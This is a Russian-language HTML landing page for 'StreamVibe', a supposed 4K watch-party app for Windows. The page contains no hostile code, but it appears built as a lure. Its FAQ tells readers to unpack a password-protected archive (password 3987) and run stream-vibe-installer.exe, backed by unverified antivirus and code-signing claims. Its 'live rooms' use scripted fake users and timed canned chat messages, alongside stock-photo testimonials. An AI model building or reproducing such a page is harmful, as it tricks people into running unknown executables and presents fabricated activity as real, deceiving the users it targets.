<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>StreamVibe - Совместный просмотр фильмов</title>
    <link rel="stylesheet" href="style.css">
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
</head>
<body>
    <!-- Navigation -->
    <header>
        <nav>
            <a href="#" class="logo">
                <i class="fas fa-play-circle"></i>
                StreamVibe
            </a>
            <div class="nav-links">
                <a href="#popular-movies">Фильмы</a>
                <a href="#features">Особенности</a>
                <a href="#faq">FAQ</a>
                <a href="#contacts">Контакты</a>
            </div>
        </nav>
    </header>

    <!-- Hero Section -->
    <section class="hero" id="hero">
        <div id="particles-js"></div>
        <div class="hero-content">
            <h1>Смотри фильмы в 4K вместе с друзьями</h1>
            <div class="hero-video">
                <iframe src="https://www.youtube.com/embed/pBk4NYhWNMM" allowfullscreen></iframe>
            </div>
            <div class="cta-container">
                <a href="#" class="cta-btn cta-primary" onclick="downloadApp()">
                    <i class="fas fa-download"></i>
                    Скачать для Windows
                </a>
                <a href="#movie-select" class="cta-btn cta-secondary" onclick="scrollToRooms()">
                    <i class="fas fa-users"></i>
                    Присоединиться к комнате
                </a>
            </div>
        </div>
    </section>

    <!-- Popular Movies -->
    <section id="popular-movies" class="popular-movies">
        <div class="section-header">
            <div class="section-icon">
                <i class="fas fa-fire"></i>
            </div>
            <h2 class="section-title">Популярное сейчас</h2>
        </div>
        <div class="movie-grid">
            <div class="movie-card" data-movie="barbie">
                <a href="https://www.imdb.com/title/tt1517268/" target="_blank" rel="noopener noreferrer">
                    <img src="img1.jpg" alt="Barbie">
                </a>
                <div class="rating">8.3</div>
                <a href="#" class="play-overlay">
                    <i class="fas fa-play"></i>
                </a>
                <div class="movie-card-content">
                    <h3>Barbie</h3>
                </div>
            </div>
            <div class="movie-card" data-movie="dune">
                <a href="https://www.imdb.com/title/tt15239678/" target="_blank" rel="noopener noreferrer">
                    <img src="img2.jpg" alt="Dune: Part Two">
                </a>
                <div class="rating">8.7</div>
                <a href="#" class="play-overlay">
                    <i class="fas fa-play"></i>
                </a>
                <div class="movie-card-content">
                    <h3>Dune: Part Two</h3>
                </div>
            </div>
            <div class="movie-card" data-movie="oppenheimer">
                <a href="https://www.imdb.com/title/tt15398776/" target="_blank" rel="noopener noreferrer">
                    <img src="img3.jpg" alt="Oppenheimer">
                </a>
                <div class="rating">8.4</div>
                <a href="#" class="play-overlay">
                    <i class="fas fa-play"></i>
                </a>
                <div class="movie-card-content">
                    <h3>Oppenheimer</h3>
                </div>
            </div>
            <div class="movie-card" data-movie="batman">
                <a href="https://www.imdb.com/title/tt1877830/" target="_blank" rel="noopener noreferrer">
                    <img src="img4.jpg" alt="The Batman">
                </a>
                <div class="rating">7.9</div>
                <a href="#" class="play-overlay">
                    <i class="fas fa-play"></i>
                </a>
                <div class="movie-card-content">
                    <h3>The Batman</h3>
                </div>
            </div>
            <div class="movie-card" data-movie="stranger">
                <a href="https://www.imdb.com/title/tt3634558/" target="_blank" rel="noopener noreferrer">
                    <img src="img5.jpg" alt="Stranger Things S5">
                </a>
                <div class="rating">8.7</div>
                <a href="#" class="play-overlay">
                    <i class="fas fa-play"></i>
                </a>
                <div class="movie-card-content">
                    <h3>Stranger Things S5</h3>
                </div>
            </div>
            <div class="movie-card" data-movie="avatar">
                <a href="https://www.imdb.com/title/tt16377254/" target="_blank" rel="noopener noreferrer">
                    <img src="img6.jpg" alt="Avatar: Fire and Ash">
                </a>
                <div class="rating">7.8</div>
                <a href="#" class="play-overlay">
                    <i class="fas fa-play"></i>
                </a>
                <div class="movie-card-content">
                    <h3>Avatar: Fire and Ash</h3>
                </div>
            </div>
        </div>
    </section>

    <!-- Features -->
    <section id="features" class="features-container">
        <div class="features">
            <div class="section-header">
                <div class="section-icon">
                    <i class="fas fa-star"></i>
                </div>
                <h2 class="section-title">Почему StreamVibe?</h2>
            </div>
            <div class="feature-grid">
                <div class="feature">
                    <i class="fas fa-users"></i>
                    <h3>Совместный просмотр</h3>
                    <p>Создавай приватные комнаты и приглашай друзей для синхронного просмотра в реальном времени</p>
                </div>
                <div class="feature">
                    <i class="fas fa-comments"></i>
                    <h3>Чат и голосовой чат</h3>
                    <p>Общайтесь во время просмотра без спойлеров. Голосовой чат для живого общения</p>
                </div>
                <div class="feature">
                    <i class="fab fa-windows"></i>
                    <h3>Оптимизировано для Windows</h3>
                    <p>Стабильная работа, минимальная нагрузка на систему и максимальная производительность</p>
                </div>
                <div class="feature">
                    <i class="fas fa-shield-alt"></i>
                    <h3>Полная приватность</h3>
                    <p>Комнаты доступны только приглашенным пользователям. End-to-End шифрование чатов</p>
                </div>
                <div class="feature">
                    <i class="fas fa-hd-desktop"></i>
                    <h3>4K и HDR качество</h3>
                    <p>Поддержка высокого разрешения и HDR контента без потери качества изображения</p>
                </div>
                <div class="feature">
                    <i class="fas fa-globe"></i>
                    <h3>Мультиплатформенность</h3>
                    <p>Интеграция с Netflix, YouTube, Amazon Prime, Disney+ и поддержка локальных файлов</p>
                </div>
            </div>
        </div>
    </section>

    <!-- How It Works -->
    <section class="how-it-works">
        <div class="section-header">
            <div class="section-icon">
                <i class="fas fa-cogs"></i>
            </div>
            <h2 class="section-title">Как это работает?</h2>
        </div>
        <div class="steps">
            <div class="step">
                <div class="step-number">01</div>
                <h3>Скачай и установи</h3>
                <p>Загрузи приложение для Windows и установи за 2 минуты</p>
            </div>
            <div class="step">
                <div class="step-number">02</div>
                <h3>Создай комнату</h3>
                <p>Выбери фильм или сериал и сгенерируй уникальную ссылку для друзей</p>
            </div>
            <div class="step">
                <div class="step-number">03</div>
                <h3>Смотрите вместе</h3>
                <p>Видео автоматически синхронизируется для всех участников комнаты</p>
            </div>
        </div>
    </section>

    <!-- Testimonials -->
    <section class="testimonials">
        <div class="section-header">
            <div class="section-icon">
                <i class="fas fa-quote-left"></i>
            </div>
            <h2 class="section-title">Что говорят наши пользователи</h2>
        </div>
        <div class="testimonial-grid">
            <div class="testimonial">
                <img src="https://images.unsplash.com/photo-1494790108755-2616b612b786?ixlib=rb-4.0.3&auto=format&fit=crop&w=60&h=60&q=80" alt="Анна" class="testimonial-avatar">
                <div class="testimonial-text">
                    "StreamVibe полностью изменил наши посиделки! Смотрим Barbie с подругами, чат работает идеально, синхронизация без задержек. Просто огонь!"
                </div>
                <div class="testimonial-author">- Анна, 22 года</div>
            </div>
            <div class="testimonial">
                <img src="https://images.unsplash.com/photo-1472099645785-5658abf4ff4e?ixlib=rb-4.0.3&auto=format&fit=crop&w=60&h=60&q=80" alt="Максим" class="testimonial-avatar">
                <div class="testimonial-text">
                    "Качество 4K просто потрясающее! Синхронизация работает без лагов даже при слабом соединении. Скачал за минуту и сразу начал пользоваться."
                </div>
                <div class="testimonial-author">- Максим, 28 лет</div>
            </div>
            <div class="testimonial">
                <img src="https://images.unsplash.com/photo-1438761681033-6461ffad8d80?ixlib=rb-4.0.3&auto=format&fit=crop&w=60&h=60&q=80" alt="Екатерина" class="testimonial-avatar">
                <div class="testimonial-text">
                    "Идеально для девичников! Приватные комнаты — это то, что нужно. Все подруги в восторге, теперь это наша основная платформа для кино."
                </div>
                <div class="testimonial-author">- Екатерина, 19 лет</div>
            </div>
            <div class="testimonial">
                <img src="https://images.unsplash.com/photo-1507003211169-0a1dd7228f2d?ixlib=rb-4.0.3&auto=format&fit=crop&w=60&h=60&q=80" alt="Дмитрий" class="testimonial-avatar">
                <div class="testimonial-text">
                    "Смотрели Oppenheimer — ощущения как в настоящем кинотеатре! Качество изображения и звука на высоте, все работает стабильно."
                </div>
                <div class="testimonial-author">- Дмитрий, 25 лет</div>
            </div>
            <div class="testimonial">
                <img src="https://images.unsplash.com/photo-1499951360447-b19be8fe80f5?ixlib=rb-4.0.3&auto=format&fit=crop&w=60&h=60&q=80" alt="Елизавета" class="testimonial-avatar">
                <div class="testimonial-text">
                    "Приватные комнаты — настоящая находка! Никто не мешает, можно спокойно обсуждать сюжет. Интерфейс интуитивно понятный."
                </div>
                <div class="testimonial-author">- Елизавета, 21 год</div>
            </div>
            <div class="testimonial">
                <img src="https://images.unsplash.com/photo-1500648767791-00dcc994a43e?ixlib=rb-4.0.3&auto=format&fit=crop&w=60&h=60&q=80" alt="Сергей" class="testimonial-avatar">
                <div class="testimonial-text">
                    "Простое и удобное приложение. Скачал, установил, создали комнату — и сразу в дело. Никаких сложностей, всё работает как часы."
                </div>
                <div class="testimonial-author">- Сергей, 30 лет</div>
            </div>
        </div>
    </section>

    <!-- FAQ -->
    <section id="faq" class="faq">
        <div class="section-header">
            <div class="section-icon">
                <i class="fas fa-question-circle"></i>
            </div>
            <h2 class="section-title">Часто задаваемые вопросы</h2>
        </div>
        <div class="faq-container">
            <div class="faq-item">
                <div class="faq-question">
                    <span>Как скачать и установить приложение?</span>
                    <i class="fas fa-plus icon"></i>
                </div>
                <div class="faq-answer">
                    <strong>Простая установка в 4 шага:</strong>
                    <ul>
                        <li>Нажмите кнопку "Скачать для Windows" на главной странице</li>
                        <li>Распакуйте архив (пароль: 3987)</li>
                        <li>Запустите stream-vibe-installer.exe</li>
                        <li>Следуйте инструкциям установщика (2-3 минуты)</li>
                    </ul>
                    <p><strong>Поддержка:</strong> доступна 24/7 через встроенный чат</p>
                </div>
            </div>
            <div class="faq-item">
                <div class="faq-question">
                    <span>На каких платформах работает StreamVibe?</span>
                    <i class="fas fa-plus icon"></i>
                </div>
                <div class="faq-answer">
                    <strong>Текущая поддержка:</strong>
                    <ul>
                        <li>Windows 10/11 — полная поддержка (64-bit)</li>
                        <li>Браузерная версия — Chrome, Firefox, Safari</li>
                    </ul>
                    <strong>В разработке:</strong>
                    <ul>
                        <li>macOS — релиз через 2-3 месяца</li>
                        <li>iOS/Android — первая половина 2026 года</li>
                    </ul>
                    <p><strong>Системные требования:</strong> 4 ГБ RAM, 100 МБ места</p>
                </div>
            </div>
            <div class="faq-item">
                <div class="faq-question">
                    <span>Как работает синхронизация видео?</span>
                    <i class="fas fa-plus icon"></i>
                </div>
                <div class="faq-answer">
                    <strong>Технология SyncTime™ обеспечивает:</strong>
                    <ul>
                        <li>Задержка <100мс даже при медленном соединении</li>
                        <li>Автоматическая компенсация буферизации</li>
                        <li>Адаптивная синхронизация под разную скорость интернета</li>
                        <li>Резервное копирование через WebRTC</li>
                    </ul>
                    <p>Система автоматически подстраивается под каждого участника комнаты</p>
                </div>
            </div>
            <div class="faq-item">
                <div class="faq-question">
                    <span>Какие стриминговые сервисы поддерживаются?</span>
                    <i class="fas fa-plus icon"></i>
                </div>
                <div class="faq-answer">
                    <strong>Полная поддержка:</strong>
                    <ul>
                        <li>YouTube — все видео включая 4K и 60 FPS</li>
                        <li>Netflix — премиум контент (требуется подписка)</li>
                        <li>Amazon Prime Video — 4K HDR контент</li>
                        <li>Disney+ — Marvel, Star Wars, Pixar</li>
                        <li>HBO Max — контент Warner Bros.</li>
                    </ul>
                    <strong>Дополнительно:</strong>
                    <ul>
                        <li>Спорт: TNT Sports, ESPN+, DAZN</li>
                        <li>Музыка: Spotify, Apple Music</li>
                        <li>Файлы: MP4, MKV до 8K + субтитры</li>
                    </ul>
                </div>
            </div>
            <div class="faq-item">
                <div class="faq-question">
                    <span>Насколько безопасно использование?</span>
                    <i class="fas fa-plus icon"></i>
                </div>
                <div class="faq-answer">
                    <strong>Меры безопасности:</strong>
                    <ul>
                        <li>Антивирусная защита: проверено Norton, McAfee, Kaspersky</li>
                        <li>Шифрование: TLS 1.3 для соединений + AES-256 для данных</li>
                        <li>Приватность: End-to-End шифрование приватных комнат</li>
                        <li>Аутентификация: цифровая подпись Microsoft Authenticode</li>
                    </ul>
                    <strong>Что НЕ делаем:</strong>
                    <ul>
                        <li>Не собираем пароли от стриминговых сервисов</li>
                        <li>Не храним историю просмотров без согласия</li>
                        <li>Не показываем рекламу в приложении</li>
                        <li>Соответствуем GDPR и российскому законодательству</li>
                    </ul>
                    <p><strong>Важно:</strong> скачивайте только с официального сайта</p>
                </div>
            </div>
            <div class="faq-item">
                <div class="faq-question">
                    <span>Поддерживается ли оффлайн просмотр?</span>
                    <i class="fas fa-plus icon"></i>
                </div>
                <div class="faq-answer">
                    <strong>Онлайн режим (основной):</strong>
                    <ul>
                        <li>1080p: от 5 Мбит/с</li>
                        <li>4K: от 25 Мбит/с</li>
                        <li>Авто-подстройка под скорость соединения</li>
                    </ul>
                    <strong>Оффлайн возможности:</strong>
                    <ul>
                        <li>Локальные файлы: MP4, MKV до 8K разрешения</li>
                        <li>Скачивание: Netflix, YouTube Premium</li>
                        <li>Локальная сеть: Wi-Fi без интернета (multicast протокол)</li>
                    </ul>
                    <strong>Хранение:</strong>
                    <ul>
                        <li>Автоматическая папка C:\StreamVibe\Offline</li>
                        <li>Поддержка USB/HDD накопителей</li>
                        <li>Встроенный плеер с субтитрами и эквалайзером</li>
                    </ul>
                    <p><strong>Ограничения:</strong> чат работает только в локальной сети, нет облачного сохранения прогресса</p>
                </div>
            </div>
        </div>
    </section>

    <!-- Movie Rooms -->
    <section id="movie-select">
        <div class="section-header">
            <div class="section-icon">
                <i class="fas fa-video"></i>
            </div>
            <h2 class="section-title">Активные комнаты</h2>
        </div>
        <div class="rooms-header">
            <input type="text" id="search" placeholder="Поиск комнат..." onkeyup="filterRooms()">
            <button class="create-room-btn" onclick="createRoom()">
                <i class="fas fa-plus"></i>
                Создать комнату
            </button>
        </div>
        <div class="movie-rooms">
            <div class="room-card" data-room="interstellar" onclick="joinRoom('interstellar')">
                <img src="mimg1.jpg" alt="Interstellar">
                <h4>Interstellar</h4>
                <div class="viewers">12 зрителей</div>
                <span class="room-status">В эфире</span>
            </div>
            <div class="room-card" data-room="inception" onclick="joinRoom('inception')">
                <img src="mimg2.jpg" alt="Inception">
                <h4>Inception</h4>
                <div class="viewers">8 зрителей</div>
                <span class="room-status">В эфире</span>
            </div>
            <div class="room-card" data-room="dark-knight" onclick="joinRoom('dark-knight')">
                <img src="mimg3.jpg" alt="The Dark Knight">
                <h4>The Dark Knight</h4>
                <div class="viewers">15 зрителей</div>
                <span class="room-status">В эфире</span>
            </div>
            <div class="room-card waiting" data-room="pulp-fiction" onclick="joinRoom('pulp-fiction')">
                <img src="mimg4.jpg" alt="Pulp Fiction">
                <h4>Pulp Fiction</h4>
                <div class="viewers">5 зрителей</div>
                <span class="room-status">Ожидает</span>
            </div>
            <div class="room-card" data-room="matrix" onclick="joinRoom('matrix')">
                <img src="mimg5.jpg" alt="The Matrix">
                <h4>The Matrix</h4>
                <div class="viewers">9 зрителей</div>
                <span class="room-status">В эфире</span>
            </div>
            <div class="room-card" data-room="fight-club" onclick="joinRoom('fight-club')">
                <img src="mimg6.jpg" alt="Fight Club">
                <h4>Fight Club</h4>
                <div class="viewers">7 зрителей</div>
                <span class="room-status">В эфире</span>
            </div>
        </div>
    </section>

    <!-- Watch Party -->
    <section id="watch-party">
        <div class="watch-party-container">
            <div class="party-header">
                <h2 class="party-title" id="party-title">Загрузка...</h2>
                <div class="party-buttons">
                    <button onclick="shareRoom()">
                        <i class="fas fa-share-alt"></i>
                        Поделиться ссылкой
                    </button>
                    <button onclick="leaveRoom()">
                        <i class="fas fa-sign-out-alt"></i>
                        Выйти из комнаты
                    </button>
                </div>
            </div>
            
            <div class="party-users">
                <h3 id="users-title">Участники комнаты</h3>
                <div id="users-list"></div>
            </div>
            
            <div class="player-chat">
                <div id="video-player">
                    <iframe id="room-video" src="" width="100%" height="100%" frameborder="0" allowfullscreen></iframe>
                </div>
                <div id="chat">
                    <h3>
                        <i class="fas fa-comments"></i>
                        Чат комнаты
                    </h3>
                    <ul id="messages"></ul>
                    <div class="chat-input">
                        <input type="text" id="message-input" placeholder="Напишите сообщение..." onkeypress="handleKeyPress(event)">
                        <button onclick="sendMessage()">
                            <i class="fas fa-paper-plane"></i>
                        </button>
                    </div>
                </div>
            </div>
        </div>
    </section>

    <!-- Footer -->
    <footer id="contacts">
        <div class="section-header">
            <div class="section-icon">
                <i class="fas fa-envelope"></i>
            </div>
            <h2>Связаться с нами</h2>
        </div>
        <div class="contacts">
            <a href="#" class="contact-link" title="Telegram">
                <i class="fab fa-telegram-plane"></i>
            </a>
            <a href="#" class="contact-link" title="Discord">
                <i class="fab fa-discord"></i>
            </a>
            <a href="#" class="contact-link" title="Twitter">
                <i class="fab fa-twitter"></i>
            </a>
            <a href="#" class="contact-link" title="YouTube">
                <i class="fab fa-youtube"></i>
            </a>
        </div>
        <div class="contact-form">
            <h3>Обратная связь</h3>
            <form id="contact-form">
                <div class="error" id="form-error"></div>
                <input type="text" placeholder="Ваше имя" required>
                <input type="email" placeholder="Email" required>
                <textarea placeholder="Сообщение" required></textarea>
                <button type="submit">Отправить</button>
            </form>
        </div>
        <div class="footer-links">
            <a href="#">Политика конфиденциальности</a>
            <a href="#">Условия использования</a>
            <a href="#">Поддержка</a>
            <a href="#">О нас</a>
        </div>
    </footer>

    <!-- Download Modal -->
    <div id="download-modal" class="modal">
        <div class="modal-content">
            <h2>Скачивание началось!</h2>
            <p>Ваш файл загружается. Пожалуйста, дождитесь завершения.</p>
            <div class="progress-bar">
                <div class="progress" id="download-progress"></div>
            </div>
            <div class="modal-hint">
                <i class="fas fa-info-circle"></i>
                После скачивания запустите stream-vibe-installer.exe и следуйте инструкциям.
            </div>
        </div>
    </div>

    <script>
        // Room data with movie-specific messages
        const roomsData = {
            'interstellar': {
                title: 'Interstellar',
                video: 'https://www.youtube.com/embed/zSWdZVtXT7E',
                users: ['Алексей', 'Мария', 'Дмитрий', 'Екатерина', 'Сергей', 'Анна', 'Иван'],
                messages: [
                    'Вау, какая музыка! Ханс Циммер просто гений',
                    'Максвелл у гениален! Это космический шедевр',
                    'Эффекты просто космос, как будто сам в космосе',
                    'Сцена с черной дырой - это что-то невероятное',
                    'Коппер - лучший персонаж, такой глубокий',
                    'Осторожно, спойлеры! Но финал просто взорвал мозг'
                ]
            },
            'inception': {
                title: 'Inception',
                video: 'https://www.youtube.com/embed/YoHD9XEInc0',
                users: ['Ольга', 'Павел', 'Юлия', 'Михаил', 'Елена', 'Николай'],
                messages: [
                    'Сон во сне - это что-то! Мозг кипит',
                    'Нолан гений композиции, каждый кадр на месте',
                    'Тотем крутой! Как думаете, что это было в финале?',
                    'Саундтрек Брама просто эпичный',
                    'Эта архитектура в снах - чистое искусство',
                    'Кобб в конце... вы поняли намек?'
                ]
            },
            'dark-knight': {
                title: 'The Dark Knight',
                video: 'https://www.youtube.com/embed/EXeTwQWrcwY',
                users: ['Виктор', 'Светлана', 'Андрей', 'Татьяна', 'Константин', 'Валерия', 'Роман'],
                messages: [
                    'Джокер - лучший злодей всех времен!',
                    'Хит Леджер - легенда, просто легенда',
                    'Бэтмен на новом уровне, такой реалистичный',
                    'Монолог Джокера про хаос - просто философия',
                    'Харви Дент... какой поворот судьбы',
                    '"Почему так серьезно?" - гениальная фраза'
                ]
            },
            'pulp-fiction': {
                title: 'Pulp Fiction',
                video: 'https://www.youtube.com/embed/s7EdQ4FqbhY',
                users: ['Ирина', 'Александр', 'Наталья', 'Владимир'],
                messages: [
                    'Тарантино в своем репертуаре, диалоги огонь',
                    'Часы с Брюсом Уиллисом - лучший момент',
                    'Танец Умы Турман и Джона Траволты - икона',
                    'Сцена в кафе в начале - просто шедевр',
                    'Самуэль Л. Джексон с Библией - это искусство',
                    'Нелинейное повествование - гениально!'
                ]
            },
            'matrix': {
                title: 'The Matrix',
                video: 'https://www.youtube.com/embed/m8e-FF8MsqU',
                users: ['Евгений', 'Оксана', 'Артем', 'Марина', 'Денис', 'Ксения'],
                messages: [
                    'Красная таблетка forever! Синяя для слабаков',
                    'Эффекты bullet time до сих пор актуальны',
                    'Нео и Тринити - икона любви в sci-fi',
                    'Оракул с печеньем - лучший персонаж',
                    'Сцена в коридоре с замедлением - легенда',
                    '"Там нет ложки" - философия в действии'
                ]
            },
            'fight-club': {
                title: 'Fight Club',
                video: 'https://www.youtube.com/embed/SUXWAEX2jlg',
                users: ['Борис', 'Антонина', 'Геннадий', 'Людмила', 'Станислав'],
                messages: [
                    'Первое правило... вы поняли',
                    'Питт и Нортон - идеальный дуэт',
                    'Финал взрывает мозг! Второй раз смотреть нужно',
                    'Проект "Разгром" - это про нас всех',
                    'Мысли Тайлера Дердена - чистая правда',
                    'Сапон и его мыло - гениальная метафора'
                ]
            }
        };

        let currentRoom = null;
        let currentMessages = [];
        let currentUsers = [];
        let messageInterval = null;

        // Smooth scroll to rooms
        function scrollToRooms() {
            document.getElementById('movie-select').scrollIntoView({
                behavior: 'smooth',
                block: 'start'
            });
        }

        // Download app
        function downloadApp() {
            document.getElementById('download-modal').classList.add('visible');
            const progress = document.getElementById('download-progress');
            let width = 0;
            const interval = setInterval(() => {
                if (width >= 100) {
                    clearInterval(interval);
                } else {
                    width += Math.random() * 15;
                    if (width > 100) width = 100;
                    progress.style.width = width + '%';
                }
            }, 200);
            
            setTimeout(() => {
                document.getElementById('download-modal').classList.remove('visible');
            }, 4000);
        }

        // Room functions
        function createRoom() {
            alert('Функция создания комнаты в разработке!');
        }

        function joinRoom(roomId) {
            currentRoom = roomId;
            const roomData = roomsData[roomId];
            
            // Update title
            document.getElementById('party-title').textContent = roomData.title;
            
            // Update video
            document.getElementById('room-video').src = roomData.video;
            
            // Update users
            currentUsers = [...roomData.users, 'You'];
            updateUsersList();
            
            // Add join message
            const joinMessage = {
                user: 'Система',
                text: 'Вы присоединились к просмотру',
                time: getCurrentTime()
            };
            currentMessages = [joinMessage];
            updateChat();
            
            // Start auto messages
            startAutoMessages(roomData.messages);
            
            // Show watch party without scrolling
            document.getElementById('watch-party').classList.add('active');
            document.body.style.overflow = 'hidden';
        }

        function leaveRoom() {
            // Stop auto messages
            if (messageInterval) {
                clearInterval(messageInterval);
            }
            
            // Reset everything
            document.getElementById('watch-party').classList.remove('active');
            document.getElementById('room-video').src = '';
            document.getElementById('party-title').textContent = 'Загрузка...';
            document.body.style.overflow = '';
            
            currentRoom = null;
            currentMessages = [];
            currentUsers = [];
        }

        function shareRoom() {
            if (currentRoom) {
                const roomUrl = `${window.location.href}#room-${currentRoom}`;
                navigator.clipboard.writeText(roomUrl).then(() => {
                    alert('Ссылка на комнату скопирована в буфер обмена!');
                });
            }
        }

        // Auto message system
        function startAutoMessages(movieMessages) {
            if (messageInterval) {
                clearInterval(messageInterval);
            }
            
            messageInterval = setInterval(() => {
                if (currentMessages.length < 10) {
                    const randomMessage = movieMessages[Math.floor(Math.random() * movieMessages.length)];
                    const message = {
                        user: getRandomUser(),
                        text: randomMessage,
                        time: getCurrentTime()
                    };
                    currentMessages.push(message);
                    updateChat();
                }
            }, Math.random() * 9000 + 6000); // 6-15 seconds
        }

        function getRandomUser() {
            const users = currentUsers.filter(user => user !== 'You');
            return users[Math.floor(Math.random() * users.length)];
        }

        function getCurrentTime() {
            return new Date().toLocaleTimeString([], {hour: '2-digit', minute:'2-digit'});
        }

        // Chat functions
        function sendMessage() {
            const input = document.getElementById('message-input');
            const message = input.value.trim();
            
            if (message && currentRoom) {
                const newMessage = {
                    user: 'You',
                    text: message,
                    time: getCurrentTime()
                };
                
                currentMessages.push(newMessage);
                input.value = '';
                updateChat();
            }
        }

        function handleKeyPress(event) {
            if (event.key === 'Enter') {
                sendMessage();
            }
        }

        function updateChat() {
            const messagesContainer = document.getElementById('messages');
            messagesContainer.innerHTML = '';
            
            currentMessages.forEach(msg => {
                const li = document.createElement('li');
                if (msg.user === 'You') {
                    li.className = 'you';
                    li.innerHTML = `
                        <strong style="color: var(--primary-color);">${msg.user}</strong>
                        <span>${msg.text}</span>
                        <small>${msg.time}</small>
                    `;
                } else if (msg.user === 'Система') {
                    li.className = 'system';
                    li.innerHTML = `
                        <strong style="color: var(--accent-color);">${msg.user}</strong>
                        <span>${msg.text}</span>
                        <small>${msg.time}</small>
                    `;
                } else {
                    li.innerHTML = `
                        <strong style="color: var(--secondary-color);">${msg.user}</strong>
                        <span>${msg.text}</span>
                        <small>${msg.time}</small>
                    `;
                }
                messagesContainer.appendChild(li);
            });
            
            // Auto-scroll to bottom
            messagesContainer.scrollTop = messagesContainer.scrollHeight;
        }

        function updateUsersList() {
            const usersContainer = document.getElementById('users-list');
            const usersTitle = document.getElementById('users-title');
            usersTitle.textContent = `Участники комнаты (${currentUsers.length})`;
            usersContainer.innerHTML = '';
            
            currentUsers.forEach((user, index) => {
                const userDiv = document.createElement('div');
                userDiv.className = `user ${user === 'You' ? 'you' : ''}`;
                
                if (user === 'You') {
                    userDiv.innerHTML = `
                        <div class="user-avatar">Y</div>
                        <span>${user}</span>
                        <div class="status" style="background: var(--primary-color);"></div>
                    `;
                } else {
                    userDiv.innerHTML = `
                        <div class="user-avatar" style="background: hsl(${index * 60}, 70%, 50%);">${user.charAt(0)}</div>
                        <span>${user}</span>
                        <div class="status"></div>
                    `;
                }
                
                usersContainer.appendChild(userDiv);
            });
        }

        // Search rooms
        function filterRooms() {
            const searchTerm = document.getElementById('search').value.toLowerCase();
            const roomCards = document.querySelectorAll('.room-card');
            
            roomCards.forEach(card => {
                const title = card.querySelector('h4').textContent.toLowerCase();
                if (title.includes(searchTerm)) {
                    card.style.display = 'flex';
                } else {
                    card.style.display = 'none';
                }
            });
        }

        // FAQ functionality
        document.addEventListener('DOMContentLoaded', function() {
            const faqItems = document.querySelectorAll('.faq-item');
            
            faqItems.forEach(item => {
                const question = item.querySelector('.faq-question');
                question.addEventListener('click', () => {
                    const isActive = item.classList.contains('active');
                    
                    // Close all other items
                    faqItems.forEach(otherItem => {
                        if (otherItem !== item) {
                            otherItem.classList.remove('active');
                        }
                    });
                    
                    // Toggle current item
                    if (isActive) {
                        item.classList.remove('active');
                    } else {
                        item.classList.add('active');
                    }
                });
            });

            // Contact form
            const form = document.getElementById('contact-form');
            form.addEventListener('submit', function(e) {
                e.preventDefault();
                const errorDiv = document.getElementById('form-error');
                errorDiv.style.display = 'none';
                
                // Simulate form submission
                setTimeout(() => {
                    alert('Спасибо за ваше сообщение! Мы свяжемся с вами в ближайшее время.');
                    form.reset();
                }, 500);
            });

            // Feature animation
            const features = document.querySelectorAll('.feature');
            const observer = new IntersectionObserver((entries) => {
                entries.forEach((entry, index) => {
                    if (entry.isIntersecting) {
                        setTimeout(() => {
                            entry.target.classList.add('visible');
                        }, index * 100);
                    }
                });
            });
            
            features.forEach(feature => observer.observe(feature));

            // Steps animation
            const steps = document.querySelectorAll('.step');
            const stepObserver = new IntersectionObserver((entries) => {
                entries.forEach((entry, index) => {
                    if (entry.isIntersecting) {
                        setTimeout(() => {
                            entry.target.classList.add('visible');
                        }, index * 200);
                    }
                });
            });
            
            steps.forEach(step => stepObserver.observe(step));

            // Testimonials animation
            const testimonials = document.querySelectorAll('.testimonial');
            const testimonialObserver = new IntersectionObserver((entries) => {
                entries.forEach((entry, index) => {
                    if (entry.isIntersecting) {
                        setTimeout(() => {
                            entry.target.style.opacity = '1';
                            entry.target.style.transform = 'translateY(0)';
                        }, index * 150);
                    }
                });
            }, { threshold: 0.1 });
            
            testimonials.forEach(testimonial => {
                testimonial.style.opacity = '0';
                testimonial.style.transform = 'translateY(30px)';
                testimonialObserver.observe(testimonial);
            });
        });

        // Smooth scrolling for navigation links
        document.querySelectorAll('a[href^="#"]').forEach(anchor => {
            anchor.addEventListener('click', function (e) {
                e.preventDefault();
                const target = document.querySelector(this.getAttribute('href'));
                if (target) {
                    target.scrollIntoView({
                        behavior: 'smooth',
                        block: 'start'
                    });
                }
            });
        });
    </script>
</body>
</html>
